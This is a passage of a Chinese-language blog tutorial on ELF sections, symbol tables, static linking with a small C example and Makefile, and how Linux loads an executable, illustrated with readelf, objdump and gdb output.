Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       0000000000000000  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .data             PROGBITS         0000000000000000  00000040</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 3] .bss              NOBITS           0000000000000000  00000040</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 4] .rodata.str1.1    PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000000e  0000000000000001 AMS       0     0     1</span><br><span class="line">  [ 5] .text.startup     PROGBITS         0000000000000000  0000004e</span><br><span class="line">       0000000000000036  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 6] .rela.text.startu RELA             0000000000000000  000002e8</span><br><span class="line">       00000000000000a8  0000000000000018   I      12     5     8</span><br><span class="line">  [ 7] .comment          PROGBITS         0000000000000000  00000084</span><br><span class="line">       000000000000002c  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 8] .note.GNU-stack   PROGBITS         0000000000000000  000000b0</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [ 9] .note.gnu.propert NOTE             0000000000000000  000000b0</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [10] .eh_frame         PROGBITS         0000000000000000  000000d0</span><br><span class="line">       0000000000000030  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .rela.eh_frame    RELA             0000000000000000  00000390</span><br><span class="line">       0000000000000018  0000000000000018   I      12    10     8</span><br><span class="line">  [12] .symtab           SYMTAB           0000000000000000  00000100</span><br><span class="line">       00000000000001b0  0000000000000018          13    12     8</span><br><span class="line">  [13] .strtab           STRTAB           0000000000000000  000002b0</span><br><span class="line">       0000000000000037  0000000000000000           0     0     1</span><br><span class="line">  [14] .shstrtab         STRTAB           0000000000000000  000003a8</span><br><span class="line">       0000000000000089  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><p>section header table是一个数组结构，这个数组的位置在<em>e_shoff</em>处，共有<em>e_shnum</em>个元素(即section)，每个元素的大小为<em>e_shentsize</em>字节。每个元素的结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    sh_name;        <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word    sh_type;        <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word    sh_flags;        <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr    sh_addr;        <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off    sh_offset;        <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word    sh_size;        <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word    sh_link;        <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word    sh_info;        <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word    sh_addralign;        <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word    sh_entsize;        <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><h4 id="data节"><a href="#data节" class="headerlink" title=".data节"></a>.data节</h4><p>保存全局变量、全局静态变量、局部静态变量等可变数据</p><h4 id="rodata节"><a href="#rodata节" class="headerlink" title=".rodata节"></a>.rodata节</h4><p>保存只读的全局变量、只读的全局静态、只读的局部静态变量等只读数据</p><h4 id="text节"><a href="#text节" class="headerlink" title=".text节"></a>.text节</h4><p>保存程序指令，使用<code>objdump -d</code>可以反汇编代码信息</p><p>使用<code>size</code>命令可以查看ELF文件的代码段、数据段、BSS段的长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ size main.o</span><br><span class="line">   text   data    bss    dec    hexfilename</span><br><span class="line">    148      0      0    148     94main.o</span><br><span class="line">hno@hno-virtual-machine:~/Desktop/OTHER/111$ size a.out</span><br><span class="line">   text   data    bss    dec    hexfilename</span><br><span class="line"> 761962  20772   6048 788782  c092ea.out</span><br></pre></td></tr></table></figure><h4 id="bss节"><a href="#bss节" class="headerlink" title=".bss节"></a>.bss节</h4><p>在链接后的可执行文件中，该节保存：<strong>未初始化的全局变量，初始化为0的全局变量，未初始化的全局静态变量，初始化为0的全局静态变量，未初始化的局部静态变量，初始化为0的局部静态变量</strong>。总之，只要初始值为0（变量如果不初始化默认为0），无论时全局变量还是静态变量，都保存在该节内。</p><p>在可重定位文件中，与可执行文件中有一处不同：<strong>未初始化的全局变量</strong>保存在.common节中。原因是：未初始化的全局变量是弱符号，链接器允许多个同名的弱符号存在，并且链接的时候决定使用哪一个弱符号。在编译阶段，编译器在编译成可重定向文件时，不能确定未初始化的全局变量是否会在链接成可执行文件时使用，因为可能其他可重定位文件也存在同名的弱符号。所以就把所有未初始化的全局变量都放到.common节中，让链接器决定使用哪一个弱符号。当链接器确定了以后，链接成可执行文件时，未初始化的全局变量又最终还是放到了.bss节中。、</p><p>未初始化的全局静态变量，因为它们的作用域在当前文件内，所以不可能与其他文件的未初始化的全局静态变量冲突，所以保存在.bss节就可以了</p><p>.bss节在文件中不占空间，关于它的信息保存在节头部表中，当被加载到内存中时，操作系统会为它分配一块内存，并且分配这块内存初始化为0值，它的这种特性也就决定了它保存的变量的类型</p><h4 id="rel-text和-rel-data节"><a href="#rel-text和-rel-data节" class="headerlink" title=".rel.text和.rel.data节"></a>.rel.text和.rel.data节</h4><p>重定位表，保存对目标文件的重定位信息，也就是对代码段和数据段的绝对地址引用的位置描述。在进行重定位时，链接器会读取定位表来决定对给定符号周期什么在哪里进行重定位</p><h4 id="symtab节"><a href="#symtab节" class="headerlink" title=".symtab节"></a>.symtab节</h4><p>符号表中保存了本文件中定义的所有符号信息，符号是链接的窗口，在一个文件既可能定义了一些符号，也可能引用了其他文件的符号，它们的信息都会保存到符号表中，函数和变量名都是符号。符号表入口结构定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span>&#123;</span>  </span><br><span class="line">Elf32_Word    st_name;  </span><br><span class="line">Elf32_Addr    st_value;  </span><br><span class="line">Elf32_Word    st_size;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>     st_info;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other;  </span><br><span class="line">Elf32_Half     st_shndx;  </span><br><span class="line">&#125; Elf32_Sym;  </span><br></pre></td></tr></table></figure><p>其中st_name包含指向符号表字符串表（strtab）中的索引，从而可以获得符号名。st_value指出符号的值，可能是一个绝对值、地址等。st_size指出符号相关的内存大小，比如一个数据结构包含的字节数等。st_info规定了符号的类型和绑定属性，指出这个符号是一个数据名、函数名、section名还是源文件名，并且指出该符号的绑定属性时local、global、还是weak。</p><p><strong>全局符号</strong>：包含非静态函数、全局变量，对于链接过程，它只关心全局符号，全局符号是对文件外可见的，它们会被重定位。</p><p><strong>局部符号</strong>：包含静态函数、全局静态函数、局部静态变量，这类符号只在文件内部可见，调试器可以使用这些局部符号来分析程序或崩溃时的核心转储文件，这些符号对链接过程没有作用，链接器会忽略它们。</p><p><strong>extern c 关键字</strong> ：C++为了与C兼容，在符号管理上，为了不按照C++的符号签名的方式对符号进行扩展（C++的名称修饰机制}，C++编译器会将在”exterrn c“的大括号内的代码当作C语言处理</p><p><strong>强符号与弱符号</strong>：强符号与弱符号的概念一般都是对全局符号才有用，因为全局符号是对文件外可见的，多个文件之间相同的符号名可能冲突。局部符号对文件外不可见，只在文件内部可见，链接的时候不可能冲突。</p><p>对于C&#x2F;C++来说，编译器默认数名与初始化的全局变量为强符号，未初始化的全局变量是弱符号， 也可以通过GCC的 “<strong>attribute</strong>((weak))”来定义弱符号。链接器按以下规则处理全局符号：</p><ol><li>不允许强符号被多次定义</li><li>如果一个符号在某个目标文件中是强符号，在其它文件中是弱符号，那么链接器选择弱符号</li><li>如果一个符号在所有目标文件中都是弱符号，选择其中占用空间最大的那个符号</li></ol><p><strong>强引用与弱引用</strong></p><p>强引用：当没有在其它文件中找到对应符号的定义时,链接器报符号未定义的错误<br>弱引用：在处理弱引用时，如果该符号未定义，链接器不会对该引用报错，而是默认值为0。在GCC中，通过” <strong>atrribute</strong>((weakref))”扩展关键字来声明对一个符号的弱引用</p><h4 id="strtab节"><a href="#strtab节" class="headerlink" title=".strtab节"></a>.strtab节</h4><p>字符串表，保存ELF文件中所有的字符串。ELF文件中用到了很多字符串，比如段名&#x2F;变量名&#x2F;字符串变量等。因为字符串的长度往往不定，一种常见的做法是把字符串集中起来存放到一个表中，然后使用字符串在表中的偏移来引用字符串。</p><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><h3 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h3><p>为了节省空间和时间，一般不会将所有的代码写在同一个文件内。所以C语言允许引用其他文件里定义的符号。</p><p>假如现在有三个C文件，分别是a.c，b.c，main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// b.c</span></span><br><span class="line"><span class="type">int</span> x = <span class="number">100</span>, y = <span class="number">200</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d + %d = %d\n&quot;</span>, x, y, foo(x, y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在mian.c文件中声明了外部变量x、y和函数foo，C语言不会禁止并且在声明时也不会做什么类型检查，当然，在编译main.c时，是看不到这些外部变量和函数的定义的</p><p>编译、链接这些代码，Makefile如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CFLAGS := -Os</span><br><span class="line"></span><br><span class="line">a.out: a.o b.o main.o</span><br><span class="line">gcc -static -Wl,--verbose a.o b.o main.o</span><br><span class="line"></span><br><span class="line">a.o: a.c</span><br><span class="line">gcc $(CFLAGS) -c a.c</span><br><span class="line"></span><br><span class="line">b.o: b.c</span><br><span class="line">gcc $(CFLAGS) -c b.c</span><br><span class="line"></span><br><span class="line">main.o: main.c</span><br><span class="line">gcc $(CFLAGS) -c main.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -f *.o a.out</span><br></pre></td></tr></table></figure><p>结果生成的可执行文件能够正常地输出我们想要的内容</p><p>foo是一个函数名，在代码区。但是如果将main.c中的foo声明为一个整型，并且直接打印出这个整型，然后尝试对齐加一，即改写为如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c (changed)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> x, y;</span><br><span class="line"><span class="comment">// int foo(int a, int b);</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> foo;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, foo);</span><br><span class="line">        foo += <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// printf(&quot;%d + %d = %d\n&quot;, x, y, foo(x, y));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码执行输出：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fa1e0ff3</span><br><span class="line">Segmentation <span class="title function_">fault</span> <span class="params">(core dumped)</span></span><br></pre></td></tr></table></figure><p>能够打印出四个字节（整型为四个字节）</p><p><strong>C语言中，可以理解为没有类型，在C语言中只有内存和指针，也就是内存地址，而类型其实就是对地址的一个解读。</strong>比如有符号整型，就按照补码解读接下来的四个字节地址；而浮点型就是按照IEEE754的浮点数规定来解读接下来的四个字节地址。</p><p>而之前我们将符号foo定义为了整型，那么编译器也会按照整型4个字节来解读，而这个地址指针指向的其实还是函数foo地址，那这四个字节应该就是函数foo在代码段的前四个字节，使用<code>objdump -d a.out</code>反汇编来验证：</p><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401cd5 &lt;foo&gt;:</span><br><span class="line">  401cd5:f3 0f 1e fa          endbr64 </span><br><span class="line">  401cd9:8d 04 37             lea    (%rdi,%rsi,1),%eax</span><br><span class="line">  401cdc:c3                   retq   </span><br><span class="line">  401cdd:0f 1f 00             nopl   (%rax)</span><br></pre></td></tr></table></figure><p>foo函数在代码段的前四个字节的地址就是上面打印输出的<code>fa 1e 0f f3</code>（小端序）。</p><p>那接下来试图对foo进行加一操作相当于是对代码段的写操作，而内存中的代码段是可读可执行不可写的，所以就会输出<code>Segmentation fault (core dumped)</code></p><p>总结：</p><ul><li>编译链接的需求：<strong>允许引用其他文件（C标准称为编译单元，Compilation Unit）里定义的符号。</strong>C语言中不禁止随便声明符号的类型，但是类型不匹配是Undefined Behavior</li><li>C语言中类型的概念，<strong>C语言中的可以理解为没有类型，在C语言中眼中只有内存和指针，也就是内存地址，而所谓的C语言中的类型，其实就是对这个地址的一个解读</strong></li></ul><h3 id="程序的编译-可重定向文件"><a href="#程序的编译-可重定向文件" class="headerlink" title="程序的编译 - 可重定向文件"></a>程序的编译 - 可重定向文件</h3><p>使用<code>file</code>命令来查看<code>main.c</code>编译生成的<code>main.o</code>文件的属性</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>可以看到，<code>main.o</code>文件是可重定向文件（ relocatable）的ELF文件，这里的重定向指的就是链接过程中对外部符号的引用，也就是说，编译过的<code>main.o</code>文件对于其中声明的外部符号如<code>foo</code>，<code>x，y</code>，是不知道的</p><p>既然外部的符号是在链接时才会被main程序知道，那在编译main程序，生成可重定向文件时这些外部的符号是怎么处理的？同样使用objdump来查看编译出的main.o文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:f3 0f 1e fa          endbr64 </span><br><span class="line">   4:50                   push   %rax</span><br><span class="line">   5:8b 35 00 00 00 00    mov    0x0(%rip),%esi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:8b 3d 00 00 00 00    mov    0x0(%rip),%edi        # 11 &lt;main+0x11&gt;</span><br><span class="line">  11:e8 00 00 00 00       callq  16 &lt;main+0x16&gt;</span><br><span class="line">  16:8b 15 00 00 00 00    mov    0x0(%rip),%edx        # 1c &lt;main+0x1c&gt;</span><br><span class="line">  1c:8b 35 00 00 00 00    mov    0x0(%rip),%esi        # 22 &lt;main+0x22&gt;</span><br><span class="line">  22:48 8d 3d 00 00 00 00 lea    0x0(%rip),%rdi        # 29 &lt;main+0x29&gt;</span><br><span class="line">  29:89 c1                mov    %eax,%ecx</span><br><span class="line">  2b:31 c0                xor    %eax,%eax</span><br><span class="line">  2d:e8 00 00 00 00       callq  32 &lt;main+0x32&gt;</span><br><span class="line">  32:31 c0                xor    %eax,%eax</span><br><span class="line">  34:5a                   pop    %rdx</span><br><span class="line">  35:c3                   retq</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222307512.png" alt="image-20230727153722064"></p><p>main在编译的时候，引用的外部符号都留空了</p><p>可以看到，在编译但还未链接的main.o文件中，对于引用的外界符号的部分是用留空的方式用0暂时填充的，即上图中用红框框出来的位置，%rip相对寻址的偏移量都是0，在静态链接完成后，它们的偏移量会被填上正确的数值</p><p>使用readelf工具<code>readelf -r main.o</code>查看ELF文件的重定位信息</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222308631.png" alt="image-20230727160242268"></p><p>可以将readelf的结果图和上面objdump的结果图结合起来看，能够发现前两个外部符号的偏移量：objdump的结果 + 2 &#x3D; readelf的结果，其他的以此类推。注意%rip寄存器指向了当前寄存器的末尾，也就是下一条指令的开关，所以上图中最后的偏移量要减4（y-4）</p><h3 id="程序的静态链接"><a href="#程序的静态链接" class="headerlink" title="程序的静态链接"></a>程序的静态链接</h3><p>简单来说，<strong>程序的静态链接是会把所需要的文件链接起来生成可执行的二进制文件，将相应的外部符号，填入正确的位置。</strong></p><ul><li><p>段合并</p><p>首先会把相同的段识别出来放在一起。</p></li><li><p>重定位</p><p>重定位表，可以用<code>objdump -r [fileName]</code> 查看</p><p>简单来说，就是当某个文件引用了外部符号，在编译时编译器不会阻止，编译器会认为你在链接时告诉他这些外部符号是什么，但是在编译时，他也不清楚这些符号在什么地址，因此这些符号的地址会在编译时被留空为0。此时的重定位就是链接器将这些留空为0的外部符号填上正确的地址。</p><p>链接过程可以通过<code>ld --verbose</code>来查看默认链接脚本，在需要的时候修改链接脚本。</p><p>可以通过使用gcc的<code>-Wl,--verbose</code>将<code>--verbose</code>传递给链接器ld，从而观察到静态链接的过程</p><ul><li>ldscript里面的各个section是按何种顺序“粘贴”</li><li>ctors &#x2F; dtors (constructors &#x2F; destructores) 的实现</li><li>只读数据和读写数据之间的padding</li></ul><p>可以通过objdump来查看静态链接完成以后生成的可执行文件<code>a.out</code>的内容</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222308832.png" alt="image-20230728192842496"></p><p>和前面的main.o的objdump输出对比来看，之前填0留空的地方都被填充上了正确的数值，<code>%rip</code>相对寻址的偏移量以被填上了正确的数值</p></li></ul><h3 id="静态链接库的构建与使用"><a href="#静态链接库的构建与使用" class="headerlink" title="静态链接库的构建与使用"></a>静态链接库的构建与使用</h3><p>如果要制作一个关于向量的静态链接库<code>libvector.a</code>，它包含两个源代码<code>addvec.c</code>和<code>multvec。c</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// addvec.c</span></span><br><span class="line"><span class="type">int</span> addcnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">addvec</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span>*z, <span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">addcnt++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) z[i] = x[i] + y[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// multvec.v</span></span><br><span class="line"><span class="type">int</span> multcnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">multvec</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y, <span class="type">int</span>*z, <span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">multcnt++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++) z[i] = x[i] *  y[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -c addvec.c multvec.c</span><br><span class="line">ar rcs libvector.a addvec.o multvec.o</span><br></pre></td></tr></table></figure><p>如果有个程序main.c要调用这个静态库<code>libvector.a</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="type">int</span> y[<span class="number">2</span>] = &#123;<span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="type">int</span> z[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">addvec(x, y, z, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="number">0</span>], z[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vector.h</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">addvec</span><span class="params">(<span class="type">int</span>*, <span class="type">int</span>*, <span class="type">int</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">multvec</span><span class="params">(<span class="type">int</span>*, <span class="type">int</span>*, <span class="type">int</span>*, <span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure><p>编译链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c main.c</span><br><span class="line">gcc -static main.o ./libvector.a</span><br></pre></td></tr></table></figure><h3 id="静态链接过程"><a href="#静态链接过程" class="headerlink" title="静态链接过程"></a>静态链接过程</h3><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222309678.png"></p><h2 id="可执行文件的装载"><a href="#可执行文件的装载" class="headerlink" title="可执行文件的装载"></a>可执行文件的装载</h2><h3 id="进程和装载"><a href="#进程和装载" class="headerlink" title="进程和装载"></a>进程和装载</h3><p>程序（可执行文件）和进程</p><ul><li>程序是静态概念</li><li>进程是动态概念，是跑起来的程序</li></ul><p>现代操作系统如何装载可执行文件</p><ul><li>给进程分配独立的虚拟空间</li><li>将可执行文件映射到进程的虚拟空间（mmap）</li><li>将cpu指令寄存器设置到程序的入口地址</li></ul><p>可执行文件在装载过程中实际上是映射的虚拟空间，所以可执行文件通常被叫做映像文件（Image文件）</p><h3 id="可执行ELF文件的两种视角"><a href="#可执行ELF文件的两种视角" class="headerlink" title="可执行ELF文件的两种视角"></a>可执行ELF文件的两种视角</h3><p>可执行ELF格式具有双重特性，编译器、汇编器和链接器将这个文件看成是被区段（section）头部描述的一系列逻辑区段的集合，而系统加载器将文件看成是由程序头部表描述的一系列段（segment）的集合。一个段通常会由多个区段组成。例如，一个“可加载只读”段可以由可执行代码区段、只读数据区段和动态链接器需要的符号区段组成</p><p>区段（section）是从链接器的视角来看ELF文件，对应段表Section Headers，而段（Segment）是从执行的视角来看ELF文件，也就是它会被映射到内存中，对应程序头表Program Headers。</p><p>使用命令<code>readelf -a [fileName]</code> 中的Section to Segment mapping部分可以看到可执行文件中的段的映射关系。</p><h3 id="可执行文件的程序头表"><a href="#可执行文件的程序头表" class="headerlink" title="可执行文件的程序头表"></a>可执行文件的程序头表</h3><p>用<code>readelf -h [fileName]</code>命令查看一个可执行ELF文件的ELF头时，会发现与可重定位ELF文件的ELF头有一个重大不同：可重定位文件ELF头中Start of program headers为0，因为它是没有程序头表，Program Headers，ELF64_Phdr的；而在可执行文件中，Start of program headers是有值的，为64，也就是说，在可执行ELF文件中程序头表会紧接着ELF头（因为ELF头的大小为64字节）</p><p>通过<code>readelf -l [filename]</code>可以直接查看到程序头表</p><h3 id="可执行ELF文件各个进程虚拟地址空间的映射关系"><a href="#可执行ELF文件各个进程虚拟地址空间的映射关系" class="headerlink" title="可执行ELF文件各个进程虚拟地址空间的映射关系"></a>可执行ELF文件各个进程虚拟地址空间的映射关系</h3><p>可以通过<code>cat /proc/[pid]/maps</code> 来查看某个进程的虚拟地址空间</p><p>该虚拟文件有6列，分别为：</p><table><thead><tr><th align="center">名称</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">地址</td><td align="center">虚拟内存区域的起始和终止地址</td></tr><tr><td align="center">权限</td><td align="center">虚拟内存的权限，r&#x3D;读,w&#x3D;写,x&#x3D;执行,s&#x3D;共享,p&#x3D;私有</td></tr><tr><td align="center">偏移量</td><td align="center">虚拟内存区域在被映射文件中的偏移量</td></tr><tr><td align="center">设备</td><td align="center">映像文件的主设备号和次设备号；</td></tr><tr><td align="center">节点</td><td align="center">映像文件的节点号；</td></tr><tr><td align="center">路径</td><td align="center">映像文件的路径</td></tr></tbody></table><p><code>vdso</code>的全称是虚拟动态共享库（virtual dynamic shared library），<code>vsyscall</code>的全称是虚拟系统调用（virtual system call）</p><p>总体来说，在程序加载过程中，磁盘上的可执行文件，进程的虚拟地址空间，还有机器的物理内存的映射关系如下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222309151.png"></p><h3 id="Linux下的装载过程"><a href="#Linux下的装载过程" class="headerlink" title="Linux下的装载过程"></a>Linux下的装载过程</h3><p>ELF文件的识别和装载涉及到Linux内核，这里只涉及到ELF文件处理相关的代码，实际上涉及到的更多</p><p>在bash输入命令执行某一个ELF文件时，首先bash进程调用fork()系统调用创建一个新的进程，然后新的进程调用execve()系统调用执行指定ELF文件，内核开始真正的装载工作</p><p>下图是Linux内核代码中与ELF文件的装载相关的一些代码：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222309270.png"></p><p><code>/fs/binfmt_elf.c</code>中 <code>Load_elf_binary</code>的代码解读：</p><ol><li>检查ELF文件头部信息(一致性检查)</li><li>加载程序头表(可以看到一个可执行程序必须至少有一个段（segment），而所有段的大小之和不能超过64K(65536u))</li><li>寻找和处理解释器段</li><li>装入目标程序的段(elf_map)</li><li>填写目标程序的入口地址</li><li>填写目标程序的参数，环境变量等信息(create_elf_tables)</li><li>start_thread会将 eip 和 esp 改成新的地址，就使得CPU在返回用户空间时就进入新的程序入口</li></ol><h3 id="例子：静态ELF加载器，加载-a-out-执行"><a href="#例子：静态ELF加载器，加载-a-out-执行" class="headerlink" title="例子：静态ELF加载器，加载 a.out 执行"></a>例子：静态ELF加载器，加载 a.out 执行</h3><p>用前面的<code>a.c</code>、<code>b.c</code>、<code>main.c</code>的例子来看一下静态链接的可执行文件的加载</p><p><strong>静态ELF文件的加载：将磁盘上静态链接的可执行文件按照ELF program header，正确地搬运到内存中执行。</strong></p><p>操作系统在execve时完成：</p><ul><li>操作系统在内核态调用mmap<ul><li>进程还未准备好，由内核直接执行”系统调用“</li><li>映射好a.out 的代码、数据、堆区、堆栈、vvar、vdso、vsyscall</li></ul></li><li>更简单的实现：直接读入进程的地址空间</li></ul><p>加载完成后，静态链接的程序就开始从ELF entry开始执行，之后就变成状态机，唯一的行为就是取指执行</p><p>通过<code>readelf -h a.out</code>来查看a.out文件的信息</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222310054.png" alt="image-20230729114759987"></p><p>程序入口地址为：<code>Entry point address: 0x401bc0</code>，使用gdb进行验证</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222310197.png" alt="image-20230729115042327"></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222311333.png" alt="image-20230729142012211"></p><ol><li><p>使用<code>starti</code>来使得程序在第一条指令就停下，可以看到，程序确实是从<code>0x401bc0</code>开始的，与我们上面查到的入口地址一致</p></li><li><p>用<code>cat /proc/[PID]/maps</code> 来查看这个程序中内存的内容，看到我们之前提到的代码、数据、堆区、堆栈、vvar、vdso、vsyscall都已经被映射进了内存中</p></li></ol><p>符合我们对静态程序加载时操作系统的行为的预期</p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><h3 id="什么是动态链接以及为什么需要动态链接"><a href="#什么是动态链接以及为什么需要动态链接" class="headerlink" title="什么是动态链接以及为什么需要动态链接"></a>什么是动态链接以及为什么需要动态链接</h3><p>链接是将各种代码和数据片段收集并组合为单一文件的过程，这个文件可以被加载到内存中并执行。链接可以在编译时执行，也就是源代码被翻译成机器代码时；也可以在加载时执行，也就是被加载器加载到内存中执行；甚至在运行时执行，也就是由应用程序来执行。</p><p>实际上，链接程序在链接时一般是优先链接动态库的，除非指明使用-static参数指定链接静态库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -static 